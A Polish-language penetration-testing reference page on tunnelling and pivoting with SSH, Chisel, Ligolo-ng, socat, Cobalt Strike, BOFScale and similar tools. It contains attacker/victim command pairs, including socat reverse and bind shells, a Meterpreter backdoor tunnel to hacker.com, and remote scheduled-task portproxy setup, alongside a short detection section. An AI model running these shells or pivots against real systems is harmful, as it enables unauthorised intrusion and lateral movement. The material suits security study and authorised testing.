# Tunelowanie i przekierowywanie portów

{{#include ../banners/hacktricks-training.md}}

Aby udostępnić lokalną usługę HTTP lub TCP przez publiczny relay, zobacz [udostępnianie lokalnych usług w internecie](expose-local-to-the-internet.md). Ten rozdział opisuje przekierowywanie i pivoting między hostami.

## Wskazówka dotycząca Nmap

> [!WARNING]
> Obsługa proxy w Nmap jest ograniczona do połączeń TCP i nie wpływa na skanowanie pingiem, portów ani wykrywanie systemu operacyjnego. Gdy skaner znajduje się za proxy SOCKS, **wyłącz wykrywanie hostów** (`-Pn`) i użyj **skanowania TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Końcowe polecenie używa opcji `-u` i `-i` Evil-WinRM do wskazania konta i hosta WinRM; domyślny port WinRM to 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH może przekazywać połączenia X11, dowolne porty TCP i gniazda domeny Unix przez szyfrowany kanał.<sup>[[6]](#references)</sup>

Graficzne połączenie SSH (X)

`-Y` włącza zaufane przekazywanie X11, a `-C` żąda kompresji przekazywanych danych.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Otwórz nowy port na serwerze SSH --> Inny port

Zdalne przekierowanie (`-R`) nasłuchuje na serwerze SSH i łączy się ze stroną lokalną; jawny adres bind określa, z których interfejsów można uzyskać dostęp do tego listenera.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Port lokalny --> Zaatakowany host (SSH) --> Third_box:Port

Przekierowanie lokalne (`-L`) nasłuchuje po stronie klienta i łączy się z miejscem docelowym od strony serwera SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Port lokalny --> Zhakowany host (SSH) --> Dowolne miejsce

Dynamiczne przekierowanie (`-D`) tworzy lokalny listener SOCKS4/SOCKS5, którego połączenia są otwierane po stronie zdalnej.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Połączenie wieloskokowe z ProxyJump

`-J`/`ProxyJump` łączy się z celem przez jeden lub więcej hostów przesiadkowych oddzielonych przecinkami. Opcje przekierowania dotyczą nadal końcowego połączenia SSH, więc poniższy nasłuch SOCKS otwiera połączenia do celów z `internal-target`, a nie z pierwszego bastionu. Dzięki temu nie trzeba logować się na host przesiadkowy i uruchamiać tam drugiego klienta SSH.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Opcje specyficzne dla hostów przesiadkowych należy umieścić w `~/.ssh/config`; konfiguracja wiersza poleceń przeznaczona dla hosta docelowego nie jest automatycznie stosowana do hostów pośredniczących.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Przydaje się do uzyskiwania reverse shells z hostów wewnętrznych przez DMZ na Twoim hoście:

Ustawienie `GatewayPorts` na serwerze określa, czy zdalne przekierowanie może nasłuchiwać poza interfejsem loopback; domyślna wartość to `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### Tunel VPN

Ten przykład oparty na koncie root tworzy urządzenia tun na obu hostach. Serwer musi zezwalać na przekazywanie tun, a wybrane konto musi mieć dostęp do urządzenia tun; `PermitRootLogin yes` to jeden ze sposobów użycia tutaj konta `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Włącz przekazywanie po stronie serwera

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Ustaw nową trasę po stronie klienta

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Bezpieczeństwo – atak Terrapin (CVE-2023-48795)**  
> OpenSSH 9.6 dodał rozszerzenie strict-KEX, aby przeciwdziałać atakowi Terrapin na integralność danych we wczesnej fazie transportu. Jeśli to możliwe, zaktualizuj oba końce połączenia, a w przypadku starszych implementacji postępuj zgodnie z zaleceniami dostawcy, zamiast zakładać, że samo użycie danej wersji zapewnia ochronę przekazywanego kanału.<sup>[[8]](#references)</sup>

## SSHUTTLE

Możesz tunelować cały ruch do podsieci przez host za pomocą **ssh**.\
Na przykład, przekazywać cały ruch kierowany do 10.10.10.0/24.

`sshuttle` zapewnia przezroczyste proxyowanie przez SSH i obsługuje wybór podsieci oraz własne polecenie SSH, jak pokazano poniżej.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Połącz się za pomocą klucza prywatnego

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` w Metasploit obsługuje lokalne i zdalne przekierowanie, natomiast moduł proxy SOCKS jest przeznaczony do współpracy z trasami sesji lub `autoroute` i w tych przykładach domyślnie nasłuchuje na porcie 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Port lokalny --> Zhakowany host (aktywna sesja) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Inny sposób:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon z Cobalt Strike może przekazywać połączenia SOCKS4a/SOCKS5 przez Beacon; `rportfwd` nasłuchuje na zaatakowanym hoście, natomiast `rportfwd_local` inicjuje połączenie z hostem docelowym z klienta Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Otwórz port na Team Server na interfejsach, przez które ruch ma być kierowany przez Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście Beacon**, a nie na Team Serverze, a ruch jest przesyłany do Team Servera, a stamtąd do wskazanego hosta:portu.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Instrukcja reverse-forwarding opisuje następujące działanie:<sup>[[14]](#references)</sup>

- Reverse port forward w Beaconie jest przeznaczony do **tunelowania ruchu do Team Servera, a nie do przekazywania go między poszczególnymi maszynami**.
- Ruch jest **tunelowany w ramach ruchu C2 Beacona**, w tym przez linki P2P.
- Wysokie porty zwykle pozwalają uniknąć ograniczeń dotyczących portów uprzywilejowanych, ale nadal obowiązują zasady systemu operacyjnego celu i ograniczenia wynikające z istniejących listenerów.

### rPort2Port local

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście Beacona**, a nie na Team Serverze, a **ruch jest wysyłany do klienta Cobalt Strike** (nie do Team Servera), a stamtąd do wskazanego hosta:portu.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: przekazywanie TCP w przestrzeni użytkownika bez konta

Tailcat korzysta z płaszczyzny danych Tailscale opartej na WireGuard/NAT traversal/DERP, ale nie korzysta z płaszczyzny sterowania Tailscale. Nie wymaga konta Tailscale ani uprawnień administratora, nie instaluje tras hosta ani nie zmienia DNS. W przeciwieństwie do [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) lub działającego w procesie [tailnetu BOFScale](#bofscale---cdn-fronted-in-process-tailnet), serwer udostępnia *adres tailcat* poza kanałem. Klient używa tego adresu, aby połączyć się z portem udostępnianym przez zdalny węzeł.<sup>[[62]](#references)</sup>

Jeśli usługa TCP już nasłuchuje na porcie `4444` zdalnego węzła, uruchom tam `serve`, a następnie przekaż wydrukowany adres do `forward` na kliencie. Drugie polecenie domyślnie nasłuchuje na `127.0.0.1:18080`, więc lokalny proces obsługujący wyłącznie standardowe gniazda TCP może połączyć się z tym portem loopback, a Tailcat przekaże ruch do zdalnego portu `4444`.<sup>[[62]](#references)</sup> Numery portów nie są specyficzne dla Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Adres zawiera publiczny klucz WireGuard serwera oraz, domyślnie w obecnych wydaniach, klucz wstępny. Traktuj go jak dane uwierzytelniające: serwer bez ograniczeń akceptuje peera, który zna adres. Efemeryczny adres przestaje działać po wyłączeniu serwera. Zapisany klucz `default` sprawia, że zwykłe `serve` ponownie używa tego samego adresu przy kolejnych uruchomieniach, dlatego sprawdź komunikat startowy i ogranicz klientów za pomocą `serve --allow`, jeśli adres może zostać ujawniony.<sup>[[62]](#references)</sup>

Połączenia mogą korzystać z bezpośredniej ścieżki UDP lub przekaźnika DERP. Pozwala to uniknąć konieczności używania dedykowanej domeny C2, ale nie sprawia, że aktywność sieciowa znika.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet wewnątrz procesu, frontowany przez CDN

[BOFScale](https://github.com/NetSPI/BOFscale) uruchamia zmodyfikowaną nakładkę Tailscale wewnątrz implantu Windows C2 bez instalowania sterownika TUN ani usługi. Składa się z trzech komponentów: asynchronicznego BOF-PE `tailscaled` typu CGo `c-shared`, niewielkiego BOF-PE w C++, który komunikuje się z lokalnym API, oraz asynchronicznego mostu TCP-to-SOCKS5 `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 i DERP zgodne z CDN

Tailscale zwykle używa własnych rozszerzeń HTTP Upgrade dla kanału sterującego TS2021 opartego na Noise oraz przekaźnika DERP. BOFScale zachowuje te strumienie bajtów, ale przesyła je za pomocą WebSockets RFC 6455, używając `Sec-WebSocket-Protocol: ts2021` lub `derp`, dzięki czemu kontrolowany przez operatora origin Headscale/DERP może działać za CDN, który akceptuje wyłącznie standardowe WebSocket Upgrade. Zmodyfikowany klient ponawia próbę połączenia TS2021 przez WebSockets po HTTP `500`, ponawia próbę połączenia DERP po HTTP `426` i uwzględnia konfigurację proxy hosta w kliencie WebSocket DERP; BOF ustawia `TS_DEBUG_DERP_WS_CLIENT=1`, aby pominąć pierwszą próbę, o której wiadomo, że kończy się niepowodzeniem.<sup>[[53]](#references)[[54]](#references)</sup>

CDN i proxy originu muszą zachowywać WebSocket Upgrade dla `/ts2021` i `/derp`, przekazywać `/key` jako zwykłe żądanie HTTP oraz wyłączać wewnętrzne limity czasu odczytu/zapisu, ponieważ sesje przekaźnika mogą pozostawać otwarte bezterminowo. Dostarczona konfiguracja Headscale włącza `verify_clients`, publikuje wyłącznie wbudowaną mapę DERP operatora i pozostawia `derp.urls` puste, aby zapobiec przełączeniu na przekaźniki obsługiwane przez Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Demon działający wewnątrz procesu i sterowanie przez nazwany potok

O ile nie zostanie to zmienione, punkt wejścia BOF uruchamia `tailscaled` z opcjami `-tun=userspace-networking`, `-state mem:` i `-no-logs-no-support`, a następnie tworzy potok o nazwie zawierającej UUID. Przekierowuje stdout/stderr Go przez potok systemu operacyjnego do API wyjściowego Beacon, dzięki czemu cały demon i runtime Go pozostają w pamięci, ale stan i logi nie są zapisywane w katalogu Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Lekki klient odtwarza lokalne API Tailscale HTTP/1.0 przez ten potok. Otwiera potok z `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, ponieważ warstwa `safesocket` demona podszywa się pod klienta potoku, wysyła `Tailscale-Cap: 125` i mapuje lokalne API na operacje `up`, `down`, `status`, reklamowanie tras oraz zamykanie.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Nie odłączaj ręcznie mapowanego Go BOF-PE po zażądaniu zamknięcia demona: goroutines runtime i garbage collectora mogą nadal wykonywać kod z pamięci, którą loader odmapowuje. Uruchamiaj `tailscaled` w procesie przeznaczonym do tego celu i zakończ ten proces, aby wykonać końcowe sprzątanie.<sup>[[54]](#references)</sup>

### Przekazywanie ruchu inicjowanego przez hosta przez SOCKS5 w przestrzeni użytkownika

Połączenia przychodzące z tailnetu i reklamowane trasy podsieci działają w stosie sieciowym przestrzeni użytkownika, ale zwykłe procesy na przejętym hoście nie mają trasy systemowej do nakładki. Dlatego `socksportfwd` nasłuchuje na porcie TCP dostępnym od strony ofiary, negocjuje SOCKS5 `NO AUTH` z nasłuchem demona pod adresem `0.0.0.0:1080`, wysyła `CONNECT` do docelowego hosta tailnetu i asynchronicznie przekazuje dane w obu kierunkach. Jeśli celem jest nazwa MagicDNS, używa `ATYP_DOMAIN`, dzięki czemu `tailscaled` rozwiązuje nazwę bez ujawniania jej resolverowi Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Poniżej przedstawiono minimalny przepływ pracy operatora; zarówno węzeł operatora, jak i implant muszą używać zmodyfikowanych plików binarnych, ponieważ standardowy Tailscale nie obsługuje tego rozwiązania z CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Lokalne przekierowanie może oddzielić pozorny listener uwierzytelniania od narzędzia relay: wymuś uwierzytelnienie maszyny do portu powiązanego z przejętym hostem, przekieruj ruch przez tailnet do `ntlmrelayx` i przekaż go dalej do AD CS, LDAP, HTTP, SMB lub innego zgodnego celu. Informacje o etapach specyficznych dla podatności znajdziesz w sekcjach [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) i [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8); BOFScale odpowiada wyłącznie za transport.<sup>[[54]](#references)</sup>

### Wykrywanie

Szukaj współwystępowania tych oznak, a nie pojedynczego słabego wskaźnika: runtime Go w procesie, który zwykle nie jest oparty na Go, potok UUID z liberalnym SDDL `D:(A;;GA;;;WD)`, nieoczekiwany listener SOCKS `0.0.0.0:1080` oraz długotrwałe połączenia TLS WebSocket z adresami CDN. Przy inspekcji TLS alarmuj o `Sec-WebSocket-Protocol: derp` lub `ts2021`, jeśli procesem, który je obsługuje, nie jest autoryzowana usługa `tailscaled`. Reguły `bofscale.yar` w repozytorium zawierają sygnatury pamięci dla wszystkich trzech komponentów BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Projekt udostępnia endpointy tunelowania webowego, takie jak `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` i `tunnel.php`; przed uruchomieniem lokalnego proxy prześlij jeden z obsługiwanych endpointów.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Możesz pobrać go ze strony wydań: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel przesyła ruch TCP/UDP przez HTTP, korzystając z połączenia chronionego przez SSH; używaj zgodnych wersji klienta i serwera oraz sprawdź składnię poleceń dla wybranego wydania.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) przesyła statyczne lub dynamiczne przekierowania przez WebSocket, HTTP/2 lub WebTransport (HTTP/3 przez QUIC). Bieżące kompilacje obsługują TCP, UDP, gniazda Unix, stdio, SOCKS5, proxy HTTP oraz listenery transparent proxy w systemie Linux w trybie forward i reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Uruchom serwer na komputerze atakującego i skonfiguruj pivot tak, aby łączył się na zewnątrz za pomocą `-R`. W tym kierunku listener SOCKS5 jest tworzony na **serwerze**, a żądane połączenia pochodzą z sieci **klienta/pivotu**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward używa tego samego kierunku. Na przykład poniższe polecenie udostępnia `10.10.10.20:445`, osiągalny z poziomu pivota, na porcie loopback atakującego `8445`:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Szczegóły ruchu wychodzącego i transportu

- Dodaj `-p http://user:pass@proxy:8080` do klienta, aby przejść przez jawny proxy HTTP. Użyj `socks5h://127.0.0.1:1080` w klientach takich jak `curl` (lub włącz proxied DNS w aplikacji), aby nazwy wewnętrzne były rozwiązywane poza tunelem, a nie ujawniane lokalnemu resolverowi.<sup>[[52]](#references)</sup>
- `wss://` wybiera WebSocket chroniony TLS. Klient `https://` wybiera HTTP/2, ale buforowanie lub konwersja do HTTP/1 przez reverse proxy/CDN często zakłóca dwukierunkowy strumień; podczas testowania tego trybu udostępniaj serwer wstunnel bezpośrednio.<sup>[[52]](#references)</sup>
- `wts://` wybiera WebTransport over QUIC. Uruchom serwer z `--enable-webtransport` (lub adresem nasłuchu `wts://`) i zezwól na UDP na porcie nasłuchu. Ten tryb nie może przechodzić przez standardowy proxy HTTP `CONNECT`, ponieważ taki proxy przesyła TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Projekt upstream ostrzega, aby nie traktować wbudowanego certyfikatu z podpisem własnym jako ochrony prywatności. Preferuj prawidłowy, niestandardowy certyfikat wraz z `--tls-verify-certificate` (lub mTLS), utrzymuj listenery proxy na loopback, chyba że zdalny dostęp jest zamierzony, i tuneluj już bezpieczne protokoły, gdy poufność ma znaczenie.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Szybki start Ligolo-ng opisuje interfejs TUN na proxy, weryfikację odcisku palca certyfikatu agenta oraz konfigurację tras dla tunelowanej sieci.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Powiązanie agenta i nasłuchiwanie

Ligolo-ng może dodawać listenery na agencie, które przekazują ruch na adres po stronie proxy, a zarezerwowany zakres `240.0.0.0/4` można routować, aby uzyskać dostęp do usług lokalnych agenta.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Dostęp do lokalnych portów agenta

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot uruchamia reverse tunnel z maszyny ofiary i udostępnia proxy SOCKS4 pod adresem loopback atakującego; README opisuje także poświadczenia i opcje hashy dla proxy NTLM.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot przez **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat łączy typy adresów, takie jak `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; poniższe przykłady łączą udokumentowane punkty końcowe.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port przez socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter przez SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Możesz przejść przez **non-authenticated proxy** przy użyciu udokumentowanego typu adresu PROXY w socat, wykonując tę linię zamiast ostatniej w konsoli ofiary.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunel SSL Socat

**/bin/sh console**

Utwórz certyfikaty po obu stronach: klienta i serwera

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Połącz lokalny port SSH (22) z portem 443 hosta atakującego.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink to narzędzie PuTTY do połączeń z wiersza poleceń, oferujące opcje przekierowywania SSH podobne do `ssh`.<sup>[[22]](#references)</sup>

Do określenia portu SSH używaj wielkiej litery `-P`. Opcja `-pw` jest zachowana ze względu na zgodność, ale ujawnia hasło na liście procesów; w miarę możliwości preferuj uwierzytelnianie kluczem lub `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Ponieważ ten plik binarny zostanie uruchomiony na komputerze ofiary i jest klientem SSH, otwórz usługę SSH i port na potrzeby połączenia zwrotnego; poniższy przykład używa `-R`, aby przekierować port dostępny lokalnie na maszynę atakującego.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Podczas tworzenia lub zmieniania trwałych reguł `portproxy` użyj kontekstu z uprawnieniami wymaganymi przez hosta. Firma Microsoft dokumentuje użyte poniżej formy poleceń `v4tov4` służące do dodawania, wyświetlania i usuwania reguł.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Wdrażanie `portproxy` za pomocą zaplanowanego zadania

Gdy dostępne są poświadczenia administratora, zdalne uruchomienie Harmonogramu zadań może zainstalować natywną regułę przekierowania bez przesyłania dedykowanego relay. Na przykład [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) może sprawić, że pivot będzie nasłuchiwać na TCP/443 i przekazywać połączenie do wewnętrznej usługi SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Reguła jest trwała, dlatego wyświetl ją za pomocą `netsh interface portproxy show v4tov4` i po testach usuń ją jawnie. Pamiętaj, że `portproxy` zapewnia wyłącznie przekierowanie; zapora hosta musi również zezwalać na port nasłuchujący.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

SocksOverRDP używa Remote Desktop Dynamic Virtual Channels do przesyłania połączenia SOCKS5 przez istniejącą sesję RDP; wtyczka klienta nasłuchuje na `127.0.0.1:1080`, a komponent serwera działa na celu RDP.<sup>[[25]](#references)</sup>

1. [Pliki binarne SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie używa `Dynamic Virtual Channels` (`DVC`) z funkcji Remote Desktop Service systemu Windows. DVC odpowiada za **tunelowanie pakietów przez połączenie RDP**.
